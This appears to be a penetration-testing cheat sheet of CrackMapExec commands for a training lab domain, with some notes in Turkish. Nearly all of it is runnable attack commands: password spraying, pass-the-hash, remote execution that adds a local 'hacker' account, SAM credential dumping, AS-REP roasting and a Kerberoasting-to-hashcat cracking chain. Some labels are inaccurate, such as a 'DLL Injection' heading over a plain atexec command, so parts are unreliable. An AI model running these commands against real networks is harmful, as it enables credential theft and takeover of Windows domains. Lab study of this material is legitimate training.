# CME Syntax

```
crackmapexec smb TARGET -u USER -p PASS/HASH [OPTIONS]
```

# NETWORK ENUMERATION

```
xme smb 172.16.5.0/24          # Anon scan
xme smb 172.16.5.0/24 -u '' -p ''  # Explicit null

# Port & Service Scan
xme smb 172.16.5.0/24 --gen-relay-list relay_targets.txt
xme winrm 172.16.5.0/24
xme ldap 172.16.5.0/24
```

# CREDENTIAL VALIDATION

```
xme smb 172.16.5.130 -u backupagent -p Summer18!
xme smb 172.16.5.0/24 -u administrator -p Password123
xme smb 172.16.5.0/24 -u users.txt -p 'Summer18!' --continue-on-success
xme smb 172.16.5.130 -u BACKUPAGENT -H aabbccddeeff00112233445566778899 --local-auth
```

# DOMAIN ENUMERATION

```
# Domain User Enum
xme smb 172.16.5.130 -u '' -p '' --users
xme ldap 172.16.5.130 -u administrator -p pass --kdcHost dc01.inlanefreight.local

# Group Membership
xme smb dc01.inlanefreight.local --groups -u admin -p pass
xme smb dc01 --sam  # Local SAM users

# Shares & Permissions
xme smb 172.16.5.130 -u backupagent -p hash --shares
xme smb 172.16.5.130 --share-access -u admin -p pass
```

# LATERAL MOVEMENT

```
xme smb 172.16.5.0/24 -u admin -p pass -x "whoami /all"
xme winrm target -u admin -p pass
xme winrm 172.16.5.130 -u admin -p pass -x "net user hacker P@ssw0rd /add"

# DLL Injection (Stealth)
xme smb target -u admin -p pass --exec-method atexec -x "powershell.exe"
```

# PRIVILEGE ESCALATION CHECKS

```
# Local Admin Check
xme smb 172.16.5.0/24 --local-auth -u backupagent -H hash

# Kerberoastable Users
xme ldap dc01 -u admin -p pass --kerberos --kdcHost dc01.inlanefreight.local

# AS-REP Roasting
xme ldap dc01 -u '' -p '' --asreproast output.asreproast
```

# POST-EXPLOITATION

```
xme smb target -u admin -p pass --sam  # SAM dump
xme smb target --local-auth -u user -H hash --sam
xme smb dc01 -u admin -p pass --bloodhound
```

# Kerberoasting Chain

```
# SPN users bul
xme ldap dc01 -u admin -p pass --kerberos > spn_users.txt

# Roast et
GetUserSPNs.py -request -dc-ip dc01 inlanefreight/admin:pass

# Crack & PTH
hashcat -m 13100 roast_hashes.txt rockyou.txt
xme smb dc01 -u svc_account -H cracked_hash
```

# Important Flags

```
Flag,Purpose,Example
--local-auth,Local accounts,PTH için zorunlu
--continue-on-success,Spray devam,Credential spraying
--gen-relay-list,Relay targets,Responder entegrasyonu
-d DOMAIN,Domain belirt,inlanefreight.local
--shares,Share enum,Admin check
--sam,Local SAM dump,Privilege check
```


